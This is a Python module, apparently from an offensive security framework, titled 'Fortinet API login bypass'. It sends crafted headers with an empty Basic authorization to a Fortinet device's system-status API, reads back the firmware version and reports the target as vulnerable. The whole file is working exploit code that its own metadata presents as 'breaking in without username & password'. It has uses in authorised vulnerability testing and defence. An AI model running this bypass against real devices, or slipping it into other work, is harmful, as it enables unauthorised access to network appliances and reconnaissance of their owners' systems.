import urllib3
from lib.smf.ssl.netssl import *

MOD_INFO = {
    "Name": "Fortinet API login bypass",
    "Description": """
Attempting to bypass the Fortinet login API using
vulnerability from cve that was discovered publicly,
and just do a check, if it goes through then the output
will release the version of Fortinet that is used.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bypass", {"Description": "Breaking in without username & password"}],
    ],
    "DefaultAction": "Bypass",
    "License": "SMF License",
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
REQUIRED_OPTIONS = {"URL": ""}


def execute(options):
    target = options.get("URL")
    port = 443

    url = f"https://{target}:{port}/api/v2/monitor/system/status"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Node-Id": "1",
        "Node-Type": "fgfm",
        "Authorization": "Basic Og==",
    }

    try:
        res = storm_ssl("GET", url, headers=headers)
        if res.status_code == 200 and "version" in res.text.lower():
            print(f"{'='*40}")
            print(f"[!] VULNERABLE: {target}")
            print(
                f"[+] System Info: {res.json().get('results', {}).get('version', 'N/A')}"
            )
            print(f"{'='*40}")
        else:
            print("[-] Target not vulnerable or patched.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"[-] GLOBAL ERROR: {e}")
